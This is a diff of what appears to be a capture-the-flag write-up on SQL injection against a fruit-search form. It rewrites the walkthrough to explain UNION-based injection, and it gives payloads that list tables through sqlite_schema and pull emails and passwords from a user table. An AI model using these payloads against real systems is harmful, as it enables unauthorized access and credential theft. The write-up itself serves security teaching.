@@ -15,7 +15,7 @@ This challenge was solved "by hand", ie not using any scripts or tools that can 
 This challenge drops you into a very basic webpage, containing a simple form with a single input. Based on the data returned, the database contains data about
 fruits. The search returns data divided into 3 columns:
 
-|Name|Price|Quantity|
+|Fruit|Price|Current stock|
 |----|-----|--------|
 
 
@@ -43,19 +43,36 @@ Submitting `';--` will result in the query looking like:
 
 ```sql
 SELECT ?,?,? FROM ? WHERE ? LIKE '%';--'%';
-                                   ^^^^
 ```
 
 Looking on the syntax highlighting in the codeblock above, everything after `;` is now commented out and we have a valid query. Since `%` is a wildcard, the
 query will return everything from the table.
 
+### Appending data
+We can now start appending data to our results using `UNION` which takes two
+tables with the same amount of columns and puts them directly after each other.
+
+We can do ` Pear' UNION SELECT 1,2,3 ;-- `
+To append a new row with 1,2,3 to our search results:
+
+|Fruit|Price|Current stock|
+|----|-----|--------|
+|1|2|3|
+|Pear|84.86|26|
+
+### Table of tables
+
+The goal is to extract data from another table, so how do you know which tables are present in the database? In most database
+management systems (MySQL, PostgresSQL, SQLite etc) there exists a "schema table" which contains information about all other tables.
+In SQlite we can query this table with:
+
 ```sql
-Apple' UNION SELECT 1,2,3 ;--
+Pear' UNION SELECT 1,name,sql FROM sqlite_schema ;--
+```
+This is will give us the names of each table and the SQL query that was used to create it, which also shows each column name.
 
-Apple' UNION SELECT 1,2, name FROM sqlite_schema ;--
+We can now select our perfered columns from the users table and we have gained acess to user information and credentials.
 
-Apple' UNION SELECT 1,2, sql FROM sqlite_schema ;--
-
-Apple' UNION SELECT email,password, name FROM user ;--
-
+```sql
+Pear' UNION SELECT email,password, name FROM user ;--
 ```
